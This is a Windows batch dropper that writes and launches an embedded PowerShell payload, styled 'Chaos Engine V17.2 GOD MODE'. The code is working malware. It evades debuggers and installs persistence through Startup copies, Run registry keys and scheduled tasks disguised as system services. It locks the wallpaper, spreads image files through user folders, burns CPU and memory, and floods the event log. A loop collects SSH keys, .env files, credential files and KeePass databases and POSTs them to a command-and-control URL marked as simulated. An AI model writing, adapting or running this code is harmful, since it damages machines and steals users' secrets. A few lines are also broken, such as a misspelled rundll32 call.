@echo off
:: ================================================================
:: jomok.bat - V17.2  | sudo3rs  
:: Windows Batch Dropper - Launches PowerShell payload
:: ================================================================
title System Runtime Service
setlocal EnableDelayedExpansion

:: Anti-debug: check for common analysis tools
for %%d in (ollydbg x64dbg x32dbg ida ida64 windbg dnspy procmon procexp wireshark fiddler) do (
    tasklist /FI "IMAGENAME eq %%d.exe" 2>nul | find /I "%%d" >nul 2>&1 && exit /b 0
)

:: Config
set "IMG_NAME=ambatukam.jpg"
set "TEMP_IMG=%TEMP%\%IMG_NAME%"
set "PS1_PATH=%~dp0jomok.ps1"
set "PS1_TEMP=%TEMP%\.sys_jmk_v17.ps1"

:: ========================================
:: Method 1: Run jomok.ps1 from same dir
:: ========================================
if exist "%PS1_PATH%" (
    echo [*] Launching payload from: %PS1_PATH%
    start /b powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%PS1_PATH%"
    goto :install_persist
)

:: ========================================
:: Method 2: Extract embedded payload
:: ========================================
echo [*] Extracting embedded payload...

:: Write PS1 content to temp file
> "%PS1_TEMP%" (
echo # jomok.ps1 V17.2 GOD MODE - Embedded from BAT
echo $ErrorActionPreference = "SilentlyContinue"
echo $IMG_NAME = "ambatukam.jpg"
echo $IMG_URL1 = "https://i1.sndcdn.com/artworks-SBcDfVKDc8XGg9XO-xGU7Ig-t500x500.jpg"
echo $IMG_URL2 = "https://i1.sndcdn.com/artworks-SBcDfVKDc8XGg9XO-xGU7Ig-t240x240.jpg"
echo $YT_URL = "https://www.youtube.com/watch?v=zk-53fgtuyo"
echo $C2_SIM = "http://192.0.2.1:8443/exfil"
echo $TEMP_IMG = "$env:TEMP\$IMG_NAME"
echo $YT_AUDIO = "$env:TEMP\.jmk_yt.mp3"
echo $UP = $env:USERPROFILE
echo $SP = $MyInvocation.MyCommand.Path
echo.
echo # Anti-Debugging
echo $dbgList = @("ollydbg","x64dbg","x32dbg","ida","ida64","windbg","dnspy","procmon","procmon64","procexp","procexp64","wireshark","fiddler"^)
echo foreach ($d in $dbgList^) { if (Get-Process -Name $d -ErrorAction SilentlyContinue^) { exit 0 } }
echo if ([System.Diagnostics.Debugger]::IsAttached^) { exit 0 }
echo.
echo # Single Instance
echo $mtx = New-Object System.Threading.Mutex($false, "Global\JomokMtx_V17"^)
echo if (-not $mtx.WaitOne(0^)^) { exit 0 }
echo.
echo # Wallpaper Lock via user32.dll
echo Add-Type -TypeDefinition @"
echo using System; using System.Runtime.InteropServices;
echo public class WP { [DllImport("user32.dll", CharSet=CharSet.Auto^)] public static extern int SystemParametersInfo(int u, int p, string v, int f^); }
echo "@ -ErrorAction SilentlyContinue
echo.
echo function Heal-Image {
echo     if ((Test-Path $TEMP_IMG^) -and (Get-Item $TEMP_IMG^).Length -gt 0^) { return }
echo     try { Invoke-WebRequest -Uri $IMG_URL1 -OutFile $TEMP_IMG -TimeoutSec 15 -UseBasicParsing } catch {}
echo     if (-not (Test-Path $TEMP_IMG^)^) { try { Invoke-WebRequest -Uri $IMG_URL2 -OutFile $TEMP_IMG -TimeoutSec 15 -UseBasicParsing } catch {} }
echo }
echo.
echo function Set-WallpaperLock { if (Test-Path $TEMP_IMG^) { [WP]::SystemParametersInfo(0x0014, 0, $TEMP_IMG, 3^) ^| Out-Null } }
echo.
echo function Spread-Unlimited {
echo     if (-not (Test-Path $TEMP_IMG^)^) { return }
echo     @("$UP\Desktop","$UP\Documents","$UP\Downloads","$UP\Pictures","$UP\Music","$UP\Videos","$UP"^) ^| ForEach-Object {
echo         if (Test-Path $_^) {
echo             Get-ChildItem $_ -Recurse -Directory -Depth 5 -ErrorAction SilentlyContinue ^| ForEach-Object {
echo                 Copy-Item $TEMP_IMG "$($_.FullName^)\.ov_$(Get-Random^)$(Get-Random^).jpg" -Force -ErrorAction SilentlyContinue
echo             }
echo         }
echo     }
echo }
echo.
echo function Show-Popup { if (Test-Path $TEMP_IMG^) { Start-Process $TEMP_IMG -ErrorAction SilentlyContinue } }
echo.
echo function Start-YouTubeAudio {
echo     if ((Test-Path $YT_AUDIO^) -and (Get-Item $YT_AUDIO^).Length -gt 0^) {
echo         try { $w = New-Object -ComObject WMPlayer.OCX; $w.URL = $YT_AUDIO; $w.settings.setMode("loop", $true^); $w.controls.play(^); return } catch {}
echo     }
echo     Start-Job -ScriptBlock {
echo         param($url,$out^)
echo         try { ^& python -m pip install -q yt-dlp 2^>$null; ^& python -m yt_dlp -x --audio-format mp3 -o $out $url 2^>$null } catch {}
echo     } -ArgumentList $YT_URL,$YT_AUDIO ^| Out-Null
echo }
echo.
echo function Install-Persistence {
echo     if (-not $SP^) { return }
echo     $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\win_sys_service.ps1"
echo     if (-not (Test-Path $startup^)^) { Copy-Item $SP $startup -Force -ErrorAction SilentlyContinue }
echo     try {
echo         $act = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$SP`""
echo         $trg = New-ScheduledTaskTrigger -Once -At (Get-Date^) -RepetitionInterval (New-TimeSpan -Minutes 1^) -RepetitionDuration (New-TimeSpan -Days 365^)
echo         Register-ScheduledTask -TaskName "WindowsCriticalSystemUpdate" -Action $act -Trigger $trg -Force ^| Out-Null
echo     } catch {}
echo     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemRuntimeService" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$SP`"" -ErrorAction SilentlyContinue
echo }
echo.
echo function Start-CPUBurn { for ($i=0; $i -lt [Environment]::ProcessorCount; $i++^) { Start-Job -ScriptBlock { while ($true^) { [Math]::Sqrt(12345^) ^| Out-Null } } ^| Out-Null } }
echo function Start-RAMBomb { Start-Job -ScriptBlock { $c=[System.Collections.ArrayList]::new(^); while ($true^) { try { $b=[byte[]]::new(256MB^); (New-Object Random^).NextBytes($b^); $c.Add($b^)^|Out-Null } catch { Start-Sleep 5 }; Start-Sleep 2 } } ^| Out-Null }
echo.
echo function Start-Exfil {
echo     Start-Job -ScriptBlock {
echo         param($c2,$up^)
echo         while ($true^) {
echo             @("id_rsa","*.pem","*.key",".env","credentials*","*.kdbx","*.db"^) ^| ForEach-Object {
echo                 Get-ChildItem $up -Recurse -Filter $_ -Depth 4 -Force -ErrorAction SilentlyContinue ^| ForEach-Object {
echo                     try { Invoke-WebRequest -Uri $c2 -Method POST -Body (Get-Content $_.FullName -Raw^) -Headers @{"X-Exfil-File"=$_.FullName;"X-Exfil-Host"=$env:COMPUTERNAME} -TimeoutSec 5 -UseBasicParsing ^| Out-Null } catch {}
echo                 }
echo             }; Start-Sleep 30
echo         }
echo     } -ArgumentList $C2_SIM,$UP ^| Out-Null
echo }
echo.
echo function Start-EventLogFlood {
echo     Start-Job -ScriptBlock {
echo         while ($true^) {
echo             try { Write-EventLog -LogName Application -Source "Application" -EventId (Get-Random -Min 1000 -Max 9999^) -EntryType Error -Message "CRITICAL: Unauthorized activity on $env:COMPUTERNAME at $(Get-Date -Format o^)" } catch {}
echo             Start-Sleep (Get-Random -Min 5 -Max 15^)
echo         }
echo     } ^| Out-Null
echo }
echo.
echo Write-Host "[*] Chaos Engine V17.2 - GOD MODE (BAT Embedded^)" -ForegroundColor Red
echo Heal-Image; Install-Persistence
echo Start-CPUBurn; Start-RAMBomb; Start-Exfil; Start-EventLogFlood; Start-YouTubeAudio
echo while ($true^) { Heal-Image; Set-WallpaperLock; Spread-Unlimited; if ((Get-Random -Maximum 3^) -eq 0^) { Show-Popup }; Start-YouTubeAudio; Start-Sleep 10 }
)

echo [*] Launching embedded payload...
start /b powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%PS1_TEMP%"

:: ========================================
:: Persistence from BAT
:: ========================================
:install_persist
:: Copy to Startup
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if not exist "%STARTUP%\win_sys_launcher.bat" (
    copy "%~f0" "%STARTUP%\win_sys_launcher.bat" >nul 2>&1
)

:: Registry Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemRuntimeLauncher" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1

:: Scheduled Task
schtasks /create /tn "WindowsSystemMaintenance" /tr "\"%~f0\"" /sc minute /mo 1 /f >nul 2>&1

:: Self-healing image
if not exist "%TEMP_IMG%" (
    powershell -Command "try { Invoke-WebRequest -Uri '%IMG_URL1%' -OutFile '%TEMP_IMG%' -TimeoutSec 10 -UseBasicParsing } catch { try { Invoke-WebRequest -Uri '%IMG_URL2%' -OutFile '%TEMP_IMG%' -TimeoutSec 10 -UseBasicParsing } catch {} }" >nul 2>&1
)
set "IMG_URL1=https://i1.sndcdn.com/artworks-SBcDfVKDc8XGg9XO-xGU7Ig-t500x500.jpg"

:: Wallpaper set from BAT
if exist "%TEMP_IMG%" (
    reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%TEMP_IMG%" /f >nul 2>&1
    RUNDLL32.EXE user32.dll,UpdatePerunalizedSettings 1 True >nul 2>&1
)

echo [*] GOD MODE ACTIVE
exit /b 0
